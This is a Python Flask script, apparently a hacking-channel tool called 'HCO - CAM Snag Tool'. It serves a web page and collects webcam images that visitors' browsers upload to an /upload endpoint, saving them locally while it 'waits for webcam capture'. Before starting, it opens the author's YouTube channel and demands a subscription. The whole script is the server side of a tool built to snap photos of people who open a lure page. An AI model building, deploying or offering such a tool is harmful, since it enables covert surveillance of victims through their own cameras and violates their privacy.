import os
import threading
from flask import Flask, render_template, request

# ──────[ FLASK SETUP ]──────
app = Flask(__name__, template_folder="templates", static_folder="static")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    image = request.files['webcam']
    image.save('captured_image.jpg')
    print("\n[•] Image captured and saved as captured_image.jpg")
    return 'Image received'

# ──────[ START FLASK SERVER SAFELY ]──────
def start_flask_server():
    from werkzeug.serving import run_simple
    run_simple('0.0.0.0', 5000, app)

# ──────[ CLEAN BANNER ]──────
os.system("clear")
print("\033[1;31m╔" + "═" * 50 + "╗")
print("║{:^50}║".format("\033[1mHCO - CAM Snag Tool\033[0;31m"))
print("║{:^50}║".format("\033[32mby Azhar\033[0;31m"))
print("╚" + "═" * 50 + "╝\033[0m")
print("[•] This tool is not free. Redirecting to YouTube...")
print("[•] Press ENTER after subscribing to continue...\n")

# ──────[ REDIRECT TO YOUTUBE ]──────
os.system("xdg-open 'https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya'")
input()

# ──────[ START FLASK THREAD ]──────
threading.Thread(target=start_flask_server, daemon=True).start()

# ──────[ WAIT FOR CAPTURE ]──────
print("\n[•] Flask server started at http://127.0.0.1:5000")
print("[•] Waiting for webcam capture...\n")
